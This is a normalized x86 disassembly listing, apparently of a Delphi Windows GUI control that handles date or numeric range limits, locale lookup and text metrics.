lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd8 ]
test al al
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c05c
call sub_403e8c
sub_4829ac
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx eax
fld [ ebp + 0x8 ]
call sub_402ac4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
fild [ ebp - 0x10 ]
fstp [ ebp - 0x8 ]
fwait
fld [ ebx + 0x218 ]
call sub_402ac4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
fild [ ebp - 0x10 ]
fcomp [ ebp - 0x8 ]
fnstsw ax
sahf
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x8
fld [ ebp - 0x8 ]
fadd [ r-xdata ]
fstp [ ebp + 0x8 ]
fwait
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jne r-xdata
mov eax ebx
call sub_48283c
add esp 0xfffffff8
fstp [ esp ]
fwait
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
mov eax ebx
call sub_482e90
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_482a34
push ebx
push esi
push edi
push ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_448788
test al al
je r-xdata
mov [ esi + 0x220 ] bl
pop edx
pop edi
pop esi
pop ebx
retn
cmp bl 0x7
jne r-xdata
mov edi ebx
and edi 0x7f
push 0x2
lea eax [ esp + 0x4 ]
push eax
push 0x100c
push 0x400
call GetLocaleInfoA
movzx edi [ esp ]
sub edi 0x30
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx edi
call sub_429718
mov eax esi
mov edx [ eax ]
call [ edx + 0xcc ]
test eax eax
je r-xdata
sub_482a9c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_482b74
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebx + 0x238 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
je r-xdata
fld [ ebx + 0x228 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
je r-xdata
fld [ ebp + 0x8 ]
fcomp [ ebx + 0x238 ]
fnstsw ax
sahf
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_482b7b
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404450
retn
push [ ebx + 0x23c ]
push [ ebx + 0x238 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_482d40
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x228 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x22c ] eax
push [ ebx + 0x23c ]
push [ ebx + 0x238 ]
lea eax [ ebp - 0xc ]
call sub_40aeb0
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_406660
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ ebx + 0x20c ]
call sub_40bfdc
call sub_403e8c
sub_482b88
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x244 ] 0x0
je r-xdata
mov [ ebx + 0x230 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_448788
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx esi
call sub_4296b4
test eax eax
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c05c
call sub_403e8c
sub_482bd8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push j_sub_403e54#2
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebx + 0x228 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
je r-xdata
fld [ ebx + 0x238 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
je r-xdata
fld [ ebp + 0x8 ]
fcomp [ ebx + 0x228 ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_482cb7
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404450
retn
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebx + 0x22c ]
push [ ebx + 0x228 ]
mov eax ebx
call sub_482d40
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x238 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x23c ] eax
push [ ebx + 0x22c ]
push [ ebx + 0x228 ]
lea eax [ ebp - 0xc ]
call sub_40aeb0
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_406660
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ ebx + 0x20c ]
call sub_40bfdc
call sub_403e8c
sub_482cc4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_448788
test al al
je r-xdata
mov [ ebx + 0x240 ] esi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx esi
call sub_429744
sub_482d00
cmp dl [ eax + 0x244 ]
je r-xdata
retn
mov [ eax + 0x244 ] dl
test dl dl
je r-xdata
xor edx edx
mov [ eax + 0x218 ] edx
mov [ eax + 0x21c ] edx
mov edx [ eax + 0x210 ]
mov [ eax + 0x218 ] edx
mov edx [ eax + 0x214 ]
mov [ eax + 0x21c ] edx
jmp r-xdata
call sub_445ac0
sub_482d40
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
mov ebx eax
xor esi esi
fld [ ebp + 0x10 ]
call sub_402ac4
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
fld [ ebp + 0x8 ]
call sub_402ac4
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
fld [ ebx + 0x210 ]
call sub_402ac4
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
fld [ ebx + 0x218 ]
call sub_402ac4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
je r-xdata
cmp [ ebp - 0x18 ] 0x0
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp edx [ ebp - 0x14 ]
jne r-xdata
je r-xdata
cmp [ ebp - 0x20 ] 0x0
jge r-xdata
cmp eax [ ebp - 0x18 ]
jae r-xdata
mov eax ebx
call sub_448788
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp edx [ ebp - 0x1c ]
jne r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
cmp edx [ ebp - 0x14 ]
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax ebx
call sub_48286c
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
lea ecx [ ebp - 0x40 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xdc ]
test al al
jne r-xdata
jle r-xdata
cmp eax [ ebp - 0x20 ]
jbe r-xdata
jge r-xdata
cmp eax [ ebp - 0x18 ]
jae r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c05c
call sub_403e8c
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
cmp edx [ ebp - 0x1c ]
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_48286c
jmp r-xdata
or esi 0x1
fild [ ebp - 0x18 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
lea eax [ ebp - 0x40 ]
call sub_40a13c
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax ebx
call sub_4829ac
jmp r-xdata
jle r-xdata
cmp eax [ ebp - 0x20 ]
jbe r-xdata
or esi 0x2
fild [ ebp - 0x20 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
lea eax [ ebp - 0x30 ]
call sub_40a13c
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_4829ac
jmp r-xdata
sub_482e90
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
mov ebx eax
cmp [ ebx + 0x244 ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea eax [ ebp - 0x20 ]
call sub_40a13c
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
call sub_40a13c
mov eax ebx
call sub_448788
test al al
je r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax ebx
call sub_482924
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x210 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebx + 0x214 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x218 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x21c ] eax
mov eax ebx
call sub_448484
lea edx [ ebp - 0x20 ]
call sub_4296cc
test eax eax
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c05c
call sub_403e8c
sub_482f9c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ r-xdata ]
mov [ esi + 0x20c ] eax
xor edx edx
mov eax esi
call sub_482538
mov edx 0xbf
mov eax esi
call sub_441520
mov edx 0x9a
mov eax esi
call sub_441544
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_482ff4
push ebx
mov ebx eax
mov eax ebx
call sub_447a2c
mov eax ebx
call sub_448788
test al al
je r-xdata
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0x5
mov eax ebx
call sub_442f30
sub_48301c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov ecx [ esi + 0x8 ]
mov edx ecx
mov eax edx
mov eax [ eax + 0x8 ]
sub eax 0xfffffd13
je r-xdata
lea edi [ ecx + 0xc ]
mov eax edi
call sub_482f8c
test al al
jne r-xdata
sub eax 0x2
je r-xdata
cmp [ ebx + 0x244 ] 0x0
je r-xdata
mov eax edi
call sub_40a17c
fstp [ ebx + 0x210 ]
fwait
mov [ esp + 0x8 ] edx
mov eax [ esp + 0x8 ]
mov edx [ eax + 0x1c ]
shl edx 0x2
mov eax [ esp + 0x8 ]
mov eax [ eax + 0x20 ]
xor ecx ecx
call sub_402fc4
cmp [ ebx + 0x24a ] 0x0
je r-xdata
dec eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
lea edi [ eax + 0x1c ]
mov eax edi
call sub_482f8c
test al al
jne r-xdata
mov eax [ esp + 0x8 ]
mov eax [ eax + 0x20 ]
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov eax [ eax + 0x1c ]
dec eax
test eax eax
jl r-xdata
jmp r-xdata
mov eax edi
call sub_40a17c
fstp [ ebx + 0x218 ]
fwait
inc eax
mov [ esp + 0xc ] eax
mov [ esp ] 0x0
mov edx [ esp + 0x4 ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebx + 0x24c ]
call [ ebx + 0x248 ]
add [ esp + 0x4 ] 0x4
inc [ esp ]
dec [ esp + 0xc ]
jne r-xdata
sub eax 0xc
mov eax [ esp + 0x8 ]
movzx eax [ eax + 0xe ]
add eax [ esp ]
cmp eax 0xc
jle r-xdata
jmp r-xdata
sub_48312c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_448788
test al al
je r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_448f18
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax ebx
call sub_448484
lea edx [ ebp - 0x14 ]
call sub_4296e4
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x14 ]
mov edx [ edi ]
cmp edx [ ebp - 0x4 ]
jge r-xdata
cmp eax [ esi ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov [ edi ] edx
mov [ esi ] eax
sub_483194
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_4453e0
mov ecx r-xdata
mov edx ebx
mov eax esi
call sub_44530c
mov eax esi
mov edx [ eax ]
call [ edx + 0xd0 ]
or [ ebx + 0x4 ] eax
mov eax [ ebx + 0x24 ]
and eax 0xfffffffc
or eax 0x8
mov [ ebx + 0x24 ] eax
pop esi
pop ebx
retn
sub_4831e8
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_448788
test al al
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_448484
mov ecx ebp
mov edx edi
call sub_4296fc
cmp eax 0xffffffff
setne bl
sub_48321c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi eax
mov bl 0x1
mov eax esi
call sub_448788
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_448484
mov edx esp
call sub_42969c
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_483258
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_448788
test al al
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
test edi edi
je r-xdata
mov eax esi
call sub_448484
mov ecx ebp
mov edx edi
call sub_429728
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_483290
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp ecx
mov edi edx
mov esi eax
mov eax esi
call sub_448788
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
mov eax esp
push eax
xor ecx ecx
mov edx 0x1009
mov eax esi
call sub_442f30
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ edi ] eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ ebp ] eax
jmp r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4832e0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ r-xdata ]
mov [ esi + 0x20c ] eax
mov [ esi + 0x251 ] 0x0
xor edx edx
mov eax esi
call sub_482538
push [ esi + 0x214 ]
push [ esi + 0x210 ]
lea eax [ esi + 0x258 ]
call sub_40a13c
mov [ esi + 0x269 ] 0x0
mov [ esi + 0x252 ] 0x1
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x80000005
mov eax esi
call sub_441f04
xor edx edx
mov eax esi
call sub_441f28
mov dl 0x1
mov eax esi
call sub_4486b8
mov edx 0xba
mov eax esi
call sub_441520
mov eax esi
call sub_483390
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_483390
push ebp
mov ebp esp
add esp 0xffffff88
push ebx
mov [ ebp - 0x4 ] eax
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_483406
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call GetTextMetricsA
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
call sub_421528
push eax
mov eax [ ebp - 0x8 ]
push eax
call SelectObject
mov ebx eax
lea eax [ ebp - 0x78 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call GetTextMetricsA
push ebx
mov eax [ ebp - 0x8 ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48340d
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_48345c
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebp eax
mov edx edi
mov eax ebp
call sub_4453e0
mov ecx r-xdata
mov edx edi
mov eax ebp
call sub_44530c
cmp [ ebp + 0x254 ] 0x1
jne r-xdata
cmp [ ebp + 0x256 ] 0x1
jne r-xdata
or [ edi + 0x4 ] 0x1
xor eax eax
mov al [ ebp + 0x253 ]
mov eax [ eax * 4 + rw-data ]
or [ edi + 0x4 ] eax
or [ edi + 0x4 ] 0x9
jmp r-xdata
cmp bl 0x1
jne r-xdata
test bl bl
jne r-xdata
mov bl [ ebp + 0x250 ]
mov eax ebp
mov si 0xffc8
call sub_4038bc
test al al
je r-xdata
cmp [ ebp + 0x268 ] 0x0
je r-xdata
or [ edi + 0x4 ] 0x20
xor ebx ebx
mov bl 0x1
jmp r-xdata
cmp [ ebp + 0x269 ] 0x0
je r-xdata
or [ edi + 0x4 ] 0x10
and [ edi + 0x24 ] 0xfffffffc
pop ebp
pop edi
pop esi
pop ebx
retn
or [ edi + 0x4 ] 0x2
sub_483528
push ebx
mov ebx eax
mov eax ebx
call sub_48271c
mov dl [ ebx + 0x252 ]
mov eax ebx
call sub_483944
mov eax [ ebx + 0x290 ]
call sub_4046e4
test eax eax
jle r-xdata
pop ebx
retn
mov eax [ ebx + 0x290 ]
call sub_4048dc
push eax
push 0x0
push 0x1005
mov eax ebx
call sub_448484
push eax
call SendMessageA
sub_483590
push ebx
mov ebx eax
mov eax ebx
call sub_447a2c
mov eax ebx
call sub_483390
push 0xffffffff
push 0x0
mov eax ebx
call sub_448484
push eax
call InvalidateRect
pop ebx
retn
sub_4835b4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] ecx
mov esi eax
xor eax eax
push ebp
push j_sub_403e54
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ edx + 0x8 ]
xor ecx ecx
mov [ edx + 0xc ] ecx
mov eax [ eax + 0x8 ]
sub eax 0xfffffd09
je r-xdata
mov ebx [ edx + 0x8 ]
cmp [ esi + 0x255 ] 0x0
je r-xdata
dec eax
je r-xdata
cmp [ esi + 0x269 ] 0x0
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ebx [ edx + 0x8 ]
lea eax [ ebp - 0x10 ]
mov edx [ ebx + 0xc ]
call sub_40461c
mov eax [ ebp - 0x10 ]
call sub_40b6ec
fstp [ ebp - 0x8 ]
fwait
cmp [ esi + 0x272 ] 0x0
je r-xdata
sub eax 0x4
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
lea eax [ ebx + 0x10 ]
call sub_482f8c
test al al
je r-xdata
push esi
lea edi [ esi + 0x258 ]
lea esi [ ebx + 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea eax [ esi + 0x258 ]
call sub_40a17c
fstp [ esi + 0x210 ]
fwait
jmp r-xdata
xor eax eax
mov [ ebx + 0x20 ] eax
mov [ ebp - 0x9 ] 0x1
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0x14 ]
mov edx [ ebx + 0xc ]
call sub_40461c
mov ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ esi + 0x274 ]
call [ esi + 0x270 ]
mov al [ ebp - 0x9 ]
xor al 0x1
and eax 0x7f
mov [ ebx + 0x20 ] eax
jmp r-xdata
mov eax esi
call sub_48283c
add esp 0xfffffff8
fstp [ esp ]
fwait
lea eax [ esi + 0x258 ]
call sub_40a13c
mov [ esi + 0x255 ] 0x1
cmp [ esi + 0x28a ] 0x0
je r-xdata
dec eax
jne r-xdata
mov eax esi
mov si 0xffb3
call sub_4038bc
jmp r-xdata
push esi
lea edi [ esi + 0x258 ]
lea esi [ ebx + 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea eax [ ebx + 0x10 ]
call sub_40a17c
fstp [ ebp - 0x8 ]
fwait
cmp [ esi + 0x256 ] 0x0
jne r-xdata
mov [ esi + 0x252 ] 0x0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4837cd
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_404450
retn
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
lea eax [ ebx + 0x10 ]
call sub_40a13c
jmp r-xdata
mov edx esi
mov eax [ esi + 0x28c ]
call [ esi + 0x288 ]
jmp r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov [ esi + 0x255 ] 0x0
lea eax [ esi + 0x258 ]
call sub_40a17c
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_48286c
cmp [ esi + 0x27a ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
mov eax esi
call sub_483a08
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
mov eax esi
call sub_48286c
jmp r-xdata
mov edx esi
mov eax [ esi + 0x27c ]
call [ esi + 0x278 ]
jmp r-xdata
mov [ esi + 0x252 ] 0x1
cmp [ esi + 0x269 ] 0x0
je r-xdata
sub_483804
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_448788
test al al
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_448484
mov ecx ebp
mov edx edi
call sub_42978c
cmp eax 0xffffffff
setne bl
sub_483838
push ebp
mov ebp esp
add esp 0xffffffe8
push esi
push edi
mov esi edx
lea edi [ ebp - 0x16 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x1
mov eax [ ebp - 0x4 ]
call sub_448788
test al al
je r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x251 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x251 ] 0x1
xor eax eax
push ebp
push sub_4838d4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_448484
lea ecx [ ebp - 0x16 ]
xor edx edx
call sub_429754
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x269 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x251 ] 0x0
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x252 ] dl
sub_4838e4
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_448788
test al al
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
test edi edi
je r-xdata
mov eax esi
call sub_448484
mov ecx ebp
mov edx edi
call sub_429770
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_483944
push ebx
add esp 0xfffffff0
mov ebx eax
mov [ ebx + 0x252 ] dl
cmp [ ebx + 0x269 ] 0x0
je r-xdata
add esp 0x10
pop ebx
retn
test dl dl
je r-xdata
mov eax ebx
call sub_448484
mov ecx esp
mov edx 0x1
call sub_429754
push [ ebx + 0x214 ]
push [ ebx + 0x210 ]
mov eax ebx
call sub_482924
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_483a08
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
fld [ ebx + 0x210 ]
call sub_402a94
fabs
fstp [ ebp - 0xc ]
fwait
fld [ ebp + 0x8 ]
call sub_402a94
fabs
fld [ ebp - 0xc ]
fcompp
fnstsw ax
sahf
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x8
push [ ebx + 0x214 ]
push [ ebx + 0x210 ]
lea eax [ ebp + 0x8 ]
call sub_40a2b8
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_482924
cmp [ ebx + 0x269 ] 0x0
jne r-xdata
mov [ ebx + 0x252 ] 0x0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c05c
call sub_403e8c
sub_483aa0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x290 ]
mov edx esi
call sub_404828
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x290 ]
mov edx esi
call sub_404480
mov eax [ ebx + 0x290 ]
call sub_4048dc
push eax
push 0x0
push 0x1005
mov eax ebx
call sub_448484
push eax
call SendMessageA
sub_483ae8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi esi
mov eax [ edi + 0x1c ]
mov [ ebx + 0x1c ] eax
mov eax [ edi + 0x24 ]
mov [ ebx + 0x24 ] eax
mov eax [ edi + 0x20 ]
mov [ ebx + 0x20 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
lea eax [ ebx + 0x10 ]
mov edx [ edi + 0x10 ]
call sub_404480
pop edi
pop esi
pop ebx
retn
sub_483b18
push ebx
mov ebx eax
mov eax ebx
call sub_46d8c4
mov eax ebx
call sub_416e68
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov edx [ ebx + 0x4 ]
mov al [ edx + 0x1d ]
cmp al 0x2
je r-xdata
mov eax edx
call sub_46dabc
cmp al 0x3
jne r-xdata
pop ebx
retn
sub_483b4c
push ebx
mov ebx eax
mov eax ebx
call sub_46d8e0
mov eax ebx
call sub_416e68
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov edx [ ebx + 0x4 ]
mov al [ edx + 0x1d ]
cmp al 0x1
je r-xdata
mov eax edx
call sub_46dabc
cmp al 0x3
jne r-xdata
pop ebx
retn
sub_483ba0
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp eax 0xffffffff
je r-xdata
mov [ ebx + 0x1c ] edx
cmp eax [ ebx + 0x18 ]
jne r-xdata
mov eax ebx
call sub_46d8ec
mov eax ebx
call sub_416e68
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
pop ebx
retn
sub_483bd0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_416f90
mov edx esi
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
pop esi
pop ebx
retn
sub_483c30
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov eax esi
call sub_483c24
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx [ ebp + 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
mov edx [ ebp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax [ ebp + 0xc ]
mov [ ebx + 0x24 ] eax
mov edx [ ebp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax ebx
call sub_416e68
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
sub_483cc0
push ebx
push esi
mov ebx edx
mov esi eax
sub cl 0x1
jb r-xdata
mov esi ebx
mov [ esi + 0x18 ] 0xffffffff
mov [ esi + 0x1c ] 0xffffffff
mov [ esi + 0x24 ] 0xffffffff
mov [ esi + 0x20 ] 0xffffffff
xor eax eax
mov [ esi + 0x14 ] eax
